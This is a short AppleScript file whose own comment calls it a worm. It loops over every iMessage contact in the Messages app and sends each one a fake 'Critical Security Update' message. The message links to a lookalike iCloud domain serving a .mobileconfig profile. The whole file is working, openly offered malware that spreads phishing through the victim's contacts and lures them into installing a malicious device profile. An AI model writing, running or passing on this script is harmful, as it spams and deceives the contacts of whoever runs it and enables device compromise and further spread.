-- Worm that sends a fake system update to contacts via iMessage
tell application "Messages"
	set targetService to 1st service whose service type = iMessage
	set buddyList to buddies of targetService
	
	repeat with b in buddyList
		try
			send "🚨 Critical Security Update: https://icloud-update[.]site/InstallNow.mobileconfig" to b
		end try
	end repeat
end tell
